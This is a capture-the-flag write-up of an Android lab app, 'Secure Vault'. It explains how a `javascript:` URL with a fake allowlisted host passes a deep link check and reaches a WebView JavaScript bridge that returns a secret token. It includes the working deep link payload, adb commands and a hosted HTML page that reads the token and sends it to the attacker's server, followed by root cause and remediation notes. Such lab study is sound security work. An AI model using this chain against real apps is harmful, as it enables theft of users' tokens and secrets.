---
title: "MHL Secure Vault Writeup"
description: "A javascript: URL with a fake host passes the deep link allowlist and calls a WebView JavaScript bridge that returns a secret token."
date: 2026-10-30
categories: [Mobile Hacking, Android]
tags: [android, mobile-hacking-lab, deep-link, exported-activity, webview, javascript-interface, url-validation]
---

## Overview

Secure Vault is a Mobile Hacking Lab Android target. A deep link hands an
attacker-controlled URL to an internal WebView that has a native
`@JavascriptInterface` returning a secret token. The app tries to protect
the WebView with a host allowlist, but it validates only the host component
of the URL and never the scheme. A `javascript:` URL carrying a fake
authority passes the host check and then executes against the unguarded
bridge, leaking the token.

Root cause in one line: host allowlist enforced with
`android.net.Uri.getHost()`, no scheme check, plus a token-returning
`@JavascriptInterface` exposed to a WebView that loads externally supplied
URLs.

Final payload:

```
mhcctf://app/vault?url=javascript://portal.mhccorp.com/%250Alocation='http://127.0.0.1:9000/p.html'
```

## Target

- Package: `com.poc.mhcctf`
- Label: Secure Vault
- `minSdkVersion` 26, `targetSdkVersion` 36
- Analysis done on the statically decompiled APK (JADX output). The live lab
  instance returns the real flag from the same code path.

## Attack surface

The manifest exposes two components. `VaultActivity`, which holds the secret,
is not exported:

```xml
<activity android:name="com.poc.mhcctf.VaultActivity"
          android:exported="false"/>
```

But `DeeplinkManagerActivity` is exported and `BROWSABLE`:

```xml
<activity android:name="com.poc.mhcctf.DeeplinkManagerActivity"
          android:exported="true">
    <intent-filter>
        <action android:name="android.intent.action.VIEW"/>
        <category android:name="android.intent.category.DEFAULT"/>
        <category android:name="android.intent.category.BROWSABLE"/>
        <data android:scheme="mhcctf" android:host="app"/>
    </intent-filter>
</activity>
```

It is a classic confused deputy. It takes the deep link, reads a `url` query
parameter, and forwards it verbatim into the non-exported `VaultActivity`:

```java
String path = data.getPath();
String queryParameter = data.getQueryParameter("url");
...
} else if (path.equals("/vault")) {
    Intent intent = new Intent(this, VaultActivity.class);
    if (queryParameter != null && !queryParameter.isEmpty()) {
        intent.putExtra("extra_url", queryParameter);
    }
    startActivity(intent);
}
```

So any installed app, any browser link, or `adb` can drive `VaultActivity`
with a URL of its choosing. `exported="false"` on the vault bought nothing.

## The vulnerable component

`VaultActivity` sets up a WebView, attaches a native bridge, and tries to
gate which URLs it will load.

The allowlist and the bridge:

```java
public static final Set f2058C = Collections.unmodifiableSet(
    new HashSet(Arrays.asList("portal.mhccorp.com", "vault.mhc-internal")));

public final class MhcVaultBridge {
    @JavascriptInterface
    public String getVaultToken() {
        return "MHL{dummy_flag_replace_with_real_one}";
    }
}
```

In `onCreate`, JavaScript is enabled and the bridge is attached before any
URL is loaded, with no condition on which page it serves:

```java
this.f2059A.getSettings().setJavaScriptEnabled(true);
this.f2059A.addJavascriptInterface(new MhcVaultBridge(this, 0), "MhcVaultBridge");
```

The host validation:

```java
String host = Uri.parse(stringExtra).getHost();
if (host != null && !host.isEmpty()) {
    zContains = set.contains(host.toLowerCase());
}
...
if (zContains) {
    HashMap map = new HashMap();
    map.put("Authorization", "Bearer MHL{dummy_flag_replace_with_real_one}");
    this.f2059A.loadUrl(stringExtra, map);
    return;
}
// blocked -> fallback to a local server
new Thread(new e(this, 0)).start();
```

Two sinks are visible: the `Authorization: Bearer <token>` header on an
allowlisted load, and `MhcVaultBridge.getVaultToken()` reachable from any
page that runs JavaScript in this WebView. The job is to make the WebView run
code of our choosing while the host check believes the host is allowlisted.

## Dead end 1: the backslash host differential

The usual first idea against a `getHost()` allowlist is a parser
differential. Feed a URL where `android.net.Uri` and the WebView's Chromium
URL parser disagree on the host. The classic trick abuses the backslash:

```
http://127.0.0.1:8888\@portal.mhccorp.com
```

On old Android, `android.net.Uri` treated `\` as an ordinary character and
read the host after the last `@` as `portal.mhccorp.com`, while Chromium
treated `\` as a path separator and connected to `127.0.0.1`. That is exactly
the confusion you want, but inverted here, and in any case it no longer
exists.

Google fixed `android.net.Uri` in the April 2018 bulletin (CVE-2017-13274).
On a current device both parsers agree, and logcat confirms it:

```
W VaultActivity: Host validation failed, blocked host: 2130706433 | allowed: [vault.mhc-internal, portal.mhccorp.com]
```

The backslash terminated the authority on both sides, so the host resolved to
the numeric form of `127.0.0.1` and was rejected. Dead end, but a useful one
to document: it rules out the whole URL-parser-differential class for this
target.

## Dead end 2: the localhost header sink

Every failed validation falls back to `new Thread(new e(this, 0)).start()`.
Tracing `e` and `f` shows what that path does. The second stage of `e` loads
the app's own local server with the bearer header attached:

```java
// e.run(), case 1
HashMap map = new HashMap();
map.put("Authorization", "Bearer MHL{dummy_flag_replace_with_real_one}");
vaultActivity2.f2059A.loadUrl("http://127.0.0.1:8080/", map);
```

Tempting: the secret is sent in a header to a loopback port. If another
process owned that port, it would receive the token. But the server is
`f`, bound to `127.0.0.1:8080`, and look at how it treats the incoming
`Authorization` header:

```java
} else if (line.toLowerCase().startsWith("authorization:")) {
    line.substring(14).getClass();   // no-op
}
```

`getClass()` on the substring does nothing. R8 stripped whatever the original
code did and left a dead call behind. The header is read and discarded, then
a static "Authentication successful" HTML page is returned. That page is the
decoy screen you see on a naive attempt.

Squatting the port does not help either. If you bind `8080` first, `f.b()`
throws `EADDRINUSE`, the first stage of `e` returns early, and the
`loadUrl` with the header never runs:

```
E VaultActivity: Failed to start local server
E VaultActivity: java.net.BindException: bind failed: EADDRINUSE (Address already in use)
```

So the entire localhost path is a dead end by construction. Own the port and
the load never fires; do not own it and the token goes to a server that
throws it away.

## The bug: scheme confusion

Back to the one fact that never changed: the allowlist checks
`Uri.parse(url).getHost()` and nothing else. It never checks the scheme.

`android.net.Uri` parses any `scheme://authority/...` string as
hierarchical, so a `javascript:` URL written with a `//` authority has a
"host":

```java
Uri.parse("javascript://portal.mhccorp.com/anything").getHost()
// returns "portal.mhccorp.com"
```

That passes the allowlist. But `WebView.loadUrl` does not fetch a
`javascript:` URL over the network. It evaluates the part after
`javascript:` as script in the current document. In that script,
`//portal.mhccorp.com/anything` is just a line comment. End the comment with
a newline and the rest of the line is attacker-controlled JavaScript running
in a WebView that has an unguarded native bridge attached.

Encoding matters because the newline passes through two decoders. The deep
link value is percent-decoded once by `getQueryParameter`, then the
`javascript:` URL is percent-decoded again by the WebView. To deliver a raw
newline to the eval step, encode it as `%250A` in the deep link:
`getQueryParameter` turns `%25` into `%`, leaving `%0A`, which the WebView
decodes into the newline.

## Exploitation

The bridge attaches reliably to pages loaded after `addJavascriptInterface`,
and less reliably to the initial blank document the `javascript:` URL first
runs in. The robust chain is two stages: use the `javascript:` payload to
navigate to a page we host, and have that page call the bridge and exfiltrate
the result.

Setup. Cleartext is only permitted to `127.0.0.1` and `localhost` per the
network security config, so serve from the host and tunnel loopback into the
device:

```bash
adb reverse --remove-all
adb shell am force-stop com.poc.mhcctf
adb reverse tcp:9000 tcp:9000
python3 -m http.server 9000
```

The hosted page, `p.html`, in the server's directory:

```html
<script>
try {
  var t = MhcVaultBridge.getVaultToken();
  location = 'http://127.0.0.1:9000/leak?t=' + encodeURIComponent(t);
} catch (e) {
  location = 'http://127.0.0.1:9000/err?e=' + encodeURIComponent('' + e);
}
</script>
```

Fire the deep link. Keeping it in a file pushed to the device avoids the
shell mangling the quotes and the encoded newline:

```bash
cat > /tmp/go.sh <<'EOF'
am start -a android.intent.action.VIEW \
  -d "mhcctf://app/vault?url=javascript://portal.mhccorp.com/%250Alocation='http://127.0.0.1:9000/p.html'" \
  com.poc.mhcctf
EOF
adb push /tmp/go.sh /data/local/tmp/go.sh
adb shell sh /data/local/tmp/go.sh
```

Flow: the host check reads `portal.mhccorp.com` and passes, the WebView
evaluates the `javascript:` URL, the comment is closed by the decoded
newline, `location=...` navigates to `p.html`, the bridge is present on that
page, and the token is sent back in a query string.

## Proof

Server log:

```
127.0.0.1 - - [30/Oct/2026 16:57:47] "GET /p.html HTTP/1.1" 200 -
127.0.0.1 - - [30/Oct/2026 16:57:47] "GET /leak?t=MHL%7B.........%7D HTTP/1.1" 404 -
```

The `404` is irrelevant. The token is in the request line, which the server
logs regardless of whether a `/leak` route exists. URL-decoded,
`%7B` and `%7D` are `{` and `}`:

```
MHL{.........}
```

The flag is redacted here. Against the live lab device, the same deep link returns the real token on the `/leak` line, and nothing else in the chain changes.

## Root cause

- The host allowlist is enforced with `Uri.getHost()` and never checks the
  URL scheme, so a non-`http(s)` scheme with a crafted authority passes.
- `WebView.loadUrl` evaluates `javascript:` URLs in the current document,
  turning a passing URL into arbitrary script execution.
- `MhcVaultBridge` is exposed to the WebView with no origin restriction and
  returns a secret, so any script in the WebView can read it.
- The non-exported `VaultActivity` is reachable through the exported
  `DeeplinkManagerActivity`, which forwards the attacker URL without
  validation.

## Remediation

- Validate the scheme before the host. Accept only `http` and `https`, and
  reject everything else outright.
- Do not expose a secret-returning `@JavascriptInterface` to a WebView that
  loads externally supplied URLs. If a bridge is required, gate every method
  on the current origin and treat anything off the trusted origin as hostile.
- Validate the deep link URL in `DeeplinkManagerActivity` before forwarding
  it, rather than relying on a downstream check.
- General hardening: parse the URL once and load that same object, so no
  second parser can disagree with the one that validated it. Disable
  `setAllowFileAccess` where it is not needed, and avoid passing secrets as
  request headers to loopback servers the app does not own.

## Takeaways

The interesting work here was not the final one-liner. It was clearing the
two decoys the challenge sets up: the patched backslash differential, and the
localhost header sink that looks like a leak but discards the header in dead
R8 code. Both pull you toward the network layer. The real bug is upstream, in
the allowlist deciding what counts as an allowed URL. A host check with no
scheme check is the kind of gap that survives review precisely because the
host part looks correct.
